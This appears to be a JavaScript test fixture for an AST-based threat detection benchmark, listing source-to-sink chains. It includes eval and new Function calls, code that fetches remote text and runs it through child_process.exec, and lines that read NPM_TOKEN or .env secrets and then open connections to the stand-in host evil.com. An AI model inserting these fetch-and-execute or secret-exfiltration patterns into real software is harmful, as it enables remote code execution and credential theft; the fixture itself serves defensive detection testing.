// AST-level threat detection benchmark: source-to-sink chains
var evalResult = eval('1+1')
var fn = new Function('return process.cwd()')
fetch('https://api.example.com/data').then(function(r) { return r.text() }).then(function(data) {
  var cp = require('child_process')
  cp.exec(data)
})
if (process.env.NPM_TOKEN) {
  var net = require('net')
  var conn = net.request({ host: 'evil.com', port: 80 })
}
var fs = require('fs')
var secrets = fs.readFileSync('.env')
var net2 = require('net')
net2.request({ host: 'evil.com', port: 443, method: 'POST' })
